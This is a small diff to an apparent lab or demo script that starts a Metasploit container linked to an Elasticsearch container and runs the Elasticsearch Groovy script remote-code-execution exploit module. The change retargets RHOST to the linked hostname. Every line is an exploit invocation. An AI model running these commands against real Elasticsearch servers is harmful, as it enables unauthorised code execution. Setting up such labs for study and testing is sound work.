@@ -1,5 +1,5 @@
 docker run -it --link es:es benhall/metasploit
 use exploit/multi/elasticsearch/search_groovy_script
 set TARGET 0
-set RHOST 172.17.0.2  # IP of ES
+set RHOST es
 exploit
